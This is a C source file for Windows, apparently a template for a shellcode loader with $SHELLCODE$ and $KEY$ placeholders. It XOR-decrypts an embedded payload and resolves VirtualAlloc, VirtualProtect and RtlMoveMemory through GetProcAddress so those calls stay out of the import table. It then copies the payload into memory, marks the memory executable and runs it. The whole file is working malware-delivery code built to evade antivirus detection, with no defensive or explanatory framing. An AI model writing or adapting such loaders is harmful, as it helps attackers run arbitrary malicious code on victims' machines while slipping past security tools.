#include <windows.h>

typedef BOOL(WINAPI* pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD  flProtect);
typedef VOID (WINAPI* pRtlMoveMemory)(VOID UNALIGNED* Destination,const VOID UNALIGNED* Source, SIZE_T Length);

int main(void) {
	DWORD oldprotect = 0;
	char encryptedShellcode[] = $SHELLCODE$;
	char key[] = "$KEY$";

	char shellcode[sizeof encryptedShellcode];

	int j = 0;

	for (int i = 0; i < sizeof encryptedShellcode; i++) {
		if (j == sizeof key - 1) j = 0;
		shellcode[i] = encryptedShellcode[i] ^ key[j];
		j++;
	}

	pVirtualProtect pVP = (pVirtualProtect)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
	pVirtualAlloc pVA = (pVirtualAlloc)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
	pRtlMoveMemory pMM = (pRtlMoveMemory)GetProcAddress(GetModuleHandle("Ntdll.dll"), "RtlMoveMemory");

	LPVOID pAddress = pVA(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	pMM(pAddress, shellcode, sizeof shellcode);

	BOOL isUpdated = pVP(pAddress, sizeof shellcode, PAGE_EXECUTE_READ, &oldprotect);

	if (isUpdated != 0) {
		((void(*)())pAddress)();
	}
	return 0;
}